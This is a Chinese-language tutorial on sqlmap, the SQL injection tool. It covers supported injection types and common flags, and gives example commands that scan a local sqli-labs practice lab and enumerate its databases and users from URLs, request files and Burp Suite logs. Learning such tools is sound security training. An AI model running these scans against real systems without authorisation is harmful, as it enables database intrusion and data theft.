## SQLMAP 介绍
### SQLMAP 简介
SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。
[入口](https://github.com/sqlmapproject/sqlmap)

### SQLMAP 支持的注入类型
sqlmap 支持 5 种漏洞检测类型：
1. 基于布尔的盲注检测
2. 基于时间的盲注检测
3. 基于错误的检测
4. 基于 union 联合查询的检测
5. 基于堆叠查询的检测

### SQLMAP 常用参数介绍
```shell
sqlmap --version #查看 sqlmap 版本信息。
-h #查看功能参数（常用的）
-hh #查看所有的参数
-v #显示更详细的信息 一共 7 级, 从 0-6.默认为 1, 数值越大信息显示越详细
Target #指定目标
-d #直接连接数据库侦听端口，类似于把自己当一个客户端来连接
-u #指定 url 扫描，但 url 必须存在查询参数。例: xxx.php?id=1
-l #指定 logfile 文件进行扫描，可以结合 burpsuite 把访问的记录保存成一个 log 文件, sqlmap 可以直接加载 log 文件进行扫描
-m #如果有多个 url 地址，可以把多个 url 地址保存成一个文本文件，使用m 可以加载文本文件逐个扫描
-r #把 http 的请求头，body 保存成一个文件统一提交给 sqlmap，
sqlmap 会读取内容进行拼接请求体
--timeout #指定超时时间
--retries #指定重试次数
--skip-urlencode #不进行 URL 加密
```

### SQLMAP 常用探测方式
-  探测单个目标
> sqlmap -u "http://192.168.1.63/sqli-labs/Less-1/?id=1"
- 探测多个目标 
```shell
vim xuegod.txt
http://192.168.1.63/sqli-labs/Less-1/?id=1
http://192.168.1.63/sqli-labs/Less-2/?id=1
http://192.168.1.63/sqli-labs/Less-3/?id=1

sqlmap -m xuegod.txt --dbs --users
-m #指定文件进行探测
--dbs #探测可用数据库名称
--users #探测数据库用户名称
```
- 从文件加载 HTTP 请求进行探测 -r 用来指定 HTTP 请求文件
```shell
sqlmap -r Cookie.txt --level 3 --batch –dbs
#--level 检测级别，取值（1-5）默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，当 level
#大于等于 2 时会测试 cookie 参数，当 level 大于等于 3 时会测试 User-Agent 和 Referer，当 level=5时会测试 Host 头。
```

- 从 burpsuite 日志记录中进行探测
> sqlmap -l burpsuite.txt --leve 3 --dbs --batch
